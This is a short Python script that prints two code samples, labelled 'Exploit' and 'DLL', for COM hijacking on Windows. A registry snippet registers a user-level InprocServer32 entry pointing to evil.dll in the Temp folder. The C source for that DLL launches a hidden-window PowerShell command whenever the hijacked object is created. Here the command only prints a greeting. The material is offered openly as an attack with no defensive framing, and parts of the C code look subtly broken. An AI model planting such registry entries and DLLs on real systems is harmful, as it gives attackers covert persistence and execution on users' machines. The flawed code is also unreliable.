x = """
import winreg

key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
    r"Software\\Classes\\CLSID\\{01234567-89AB-CDEF-0123-456789ABCDEF}\\InprocServer32")
winreg.SetValueEx(key, None, 0, winreg.REG_SZ, r"C:\\Users\\Enes\\AppData\\Local\\Temp\\evil.dll")
winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
winreg.CloseKey(key)
"""

e = """
#include <windows.h>
#include <objbase.h>
#include <initguid.h>
#include <stdio.h>

DEFINE_GUID(CLSID_MyHijack,
    0x01234567, 0x89AB, 0xCDEF, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF);

typedef struct {
    IUnknownVtbl *lpVtbl;
    LONG refCount;
} MyCOMObject;

HRESULT STDMETHODCALLTYPE MyCOM_QueryInterface(IUnknown *This, REFIID riid, void **ppvObject) {
    if (IsEqualIID(riid, &IID_IUnknown)) {
        *ppvObject = This;
        MyCOM_AddRef(This);
        return S_OK;
    }
    *ppvObject = NULL;
    return E_NOINTERFACE;
}

ULONG STDMETHODCALLTYPE MyCOM_AddRef(IUnknown *This) {
    MyCOMObject *obj = (MyCOMObject *)This;
    return InterlockedIncrement(&obj->refCount);
}

ULONG STDMETHODCALLTYPE MyCOM_Release(IUnknown *This) {
    MyCOMObject *obj = (MyCOMObject *)This;
    LONG count = InterlockedDecrement(&obj->refCount);
    if (count == 0) {
        free(obj);
    }
    return count;
}

IUnknownVtbl MyCOM_Vtbl = {
    MyCOM_QueryInterface,
    MyCOM_AddRef,
    MyCOM_Release
};

HRESULT STDMETHODCALLTYPE MyCOM_CreateInstance(REFIID riid, void **ppvObject) {
    if (!ppvObject) return E_POINTER;

    MyCOMObject *obj = (MyCOMObject *)malloc(sizeof(MyCOMObject));
    if (!obj) return E_OUTOFMEMORY;

    obj->lpVtbl = &MyCOM_Vtbl;
    obj->refCount = 1;

    system("powershell.exe -WindowStyle Hidden -Command \"Write-Output 'Hello from COM Hijack'\"");

    HRESULT hr = obj->lpVtbl->QueryInterface((IUnknown *)obj, riid, ppvObject);
    obj->lpVtbl->Release((IUnknown *)obj);
    return hr;
}

HRESULT STDMETHODCALLTYPE DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID *ppv) {
    if (!IsEqualCLSID(rclsid, &CLSID_MyHijack)) return CLASS_E_CLASSNOTAVAILABLE;
    return MyCOM_CreateInstance(riid, ppv);
}

HRESULT STDMETHODCALLTYPE DllCanUnloadNow() {
    return S_OK;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    return TRUE;
}
"""

print("-----------------Exploit------------------")
print(x)
print("---------------------DLL------------------")
print(e)
